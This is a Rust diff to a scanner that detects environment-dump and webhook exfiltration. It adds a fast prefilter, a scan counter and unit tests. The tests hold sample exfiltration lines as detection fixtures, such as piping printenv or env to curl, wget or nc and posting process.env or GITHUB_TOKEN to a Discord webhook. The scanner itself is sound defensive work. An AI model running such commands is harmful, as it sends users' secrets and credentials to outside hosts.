@@ -40,11 +40,20 @@ fn credential_paths() -> &'static Regex {
     )
 }
 
+#[cfg(test)]
+thread_local! {
+    /// How many times this thread asked for the environment-dump pattern: a test counts the full
+    /// scans a file costs.
+    static ENV_DUMP_SCANS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+}
+
 /// The whole environment turned into text: a serializer (`JSON.stringify`, `util.inspect`,
 /// `json.dumps`, `str`, `repr`) around the environment or a copy of it, and `printenv` or `env`
 /// piped to a sender or substituted into its arguments. One variable (`process.env.HOME`,
 /// `printenv HOME`) is not a dump, and neither is a copy for a child process (see `env_copies`).
 fn env_dumps() -> &'static Regex {
+    #[cfg(test)]
+    ENV_DUMP_SCANS.with(|n| n.set(n.get() + 1));
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
@@ -261,10 +270,14 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
     let catchers = hits_of(catcher_hosts(), text);
     // A chat URL is HIGH when it is sent to and the file also reads the environment or a token.
     let (chat, sent) = graded_hits(chat_hosts(), text, |at| send_near(text, at));
-    let reads_secrets = env_dumps().is_match(text)
-        || secret_reads().is_match(text)
-        || credential_paths().is_match(text);
-    let high = catchers.first.is_some() || (sent && !test && reads_secrets);
+    // The three scans of the whole text are the dear part: they run only when the answer decides
+    // the level, which is the case for a chat URL that is sent to, outside a test path.
+    let high = catchers.first.is_some()
+        || (sent
+            && !test
+            && ((may_dump_env(text) && env_dumps().is_match(text))
+                || secret_reads().is_match(text)
+                || credential_paths().is_match(text)));
     let first = match (catchers.first, chat.first) {
         (Some(a), Some(b)) => Some(a.min(b)),
         (a, b) => a.or(b),
@@ -363,7 +376,22 @@ fn copy_reaches_a_send(text: &str, at: usize, lang: Lang) -> bool {
     !spawn_apis().is_match(near) && send_calls().is_match(near)
 }
 
+/// Whether `text` can hold what `env_dumps` or `env_copies` match: every alternative names
+/// `process.env`, `os.environ` or `printenv`, or is the `env` command followed by a pipe, a closing
+/// parenthesis or a backtick. A plain search for these is far cheaper than the patterns, which have
+/// no literal to start from, so the patterns run only on the files that pass.
+fn may_dump_env(text: &str) -> bool {
+    if text.contains("process.env") || text.contains("os.environ") || text.contains("printenv") {
+        return true;
+    }
+    text.match_indices("env")
+        .any(|(at, _)| text[at + 3..].trim_start().starts_with(['|', ')', '`']))
+}
+
 fn env_dump(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
+    if !may_dump_env(text) {
+        return;
+    }
     // HIGH when the dump flows to a send or a file write within 10 lines, or a copy of the
     // environment is sent. A dump in a file that talks to the network elsewhere, or in a test, is
     // MEDIUM; a dump with no network is clean. A copy that is not sent is no finding at all.
@@ -785,6 +813,83 @@ mod tests {
             let v = code(Lang::Sh, &format!("{sh}\n"));
             assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{sh}");
         }
+    }
+
+    #[test]
+    fn the_cheap_search_passes_every_text_the_environment_patterns_match() {
+        // `may_dump_env` is a filter in front of two slow patterns: it may pass more than they
+        // match, never less.
+        let texts = [
+            "JSON.stringify(process.env)",
+            "util.inspect( { ...process.env })",
+            "json.dumps(dict( os.environ))",
+            "str(os.environ)",
+            "repr(process.env)",
+            "Object.assign({}, process.env)",
+            "Object.entries(process.env)",
+            "x = os.environ.copy()",
+            "os.environ.items( )",
+            "a; printenv | curl -d @- u",
+            "(env  | wget u)",
+            "`env |nc h 1`",
+            "curl -d \"$(printenv)\" u",
+            "wget --post-data=\"`env`\" u",
+            "curl u -d $( env )",
+            "x=1\nenv\t|\tcurl u",
+        ];
+        for t in texts {
+            assert!(
+                env_dumps().is_match(t) || env_copies().is_match(t),
+                "the sample is not a match: {t:?}"
+            );
+            assert!(may_dump_env(t), "{t:?}");
+        }
+        for t in [
+            "environment = 1",
+            "const env = {}",
+            "env\nfoo",
+            "x.env('a')",
+            "",
+        ] {
+            assert!(!may_dump_env(t), "{t:?}");
+        }
+    }
+
+    #[test]
+    fn a_file_that_names_no_environment_costs_no_environment_scan() {
+        // Regression guard for the speed of a big scan: the environment-dump pattern has no
+        // literal to start from, so it is a slow pass over the whole text. A scan of vscode took
+        // 4 to 6 times as long when it ran on every script, a chat URL that is sent to included.
+        let send = format!("fetch(\"{DISCORD}\", {{ method: 'POST' }});\n");
+        let benign = format!(
+            "{send}const environment = 'dev'; // the env of this build\nconst string = String(1);\nlet env = {{}};\n"
+        );
+        for lang in [Lang::Js, Lang::Py, Lang::Sh] {
+            ENV_DUMP_SCANS.with(|n| n.set(0));
+            let v = code(lang, &benign);
+            assert!(!v.is_empty(), "the chat URL is still reported");
+            assert_eq!(ENV_DUMP_SCANS.with(std::cell::Cell::get), 0, "{lang:?}");
+        }
+        ENV_DUMP_SCANS.with(|n| n.set(0));
+        code(Lang::Js, "const a = JSON.stringify(process.env);\n");
+        assert!(ENV_DUMP_SCANS.with(std::cell::Cell::get) > 0);
+    }
+
+    #[test]
+    fn a_chat_url_that_is_sent_to_is_high_only_when_the_file_reads_secrets() {
+        let send = format!("fetch(\"{DISCORD}\", {{ method: 'POST' }});\n");
+        let none = code(Lang::Js, &send);
+        assert_eq!(one(&none, "exfil.webhook").severity, Severity::Medium);
+        let env = format!("{send}const all = JSON.stringify(process.env);\n");
+        assert_eq!(
+            one(&code(Lang::Js, &env), "exfil.webhook").severity,
+            Severity::High
+        );
+        let token = format!("{send}const t = process.env.GITHUB_TOKEN;\n");
+        assert_eq!(
+            one(&code(Lang::Js, &token), "exfil.webhook").severity,
+            Severity::High
+        );
     }
 
     #[test]
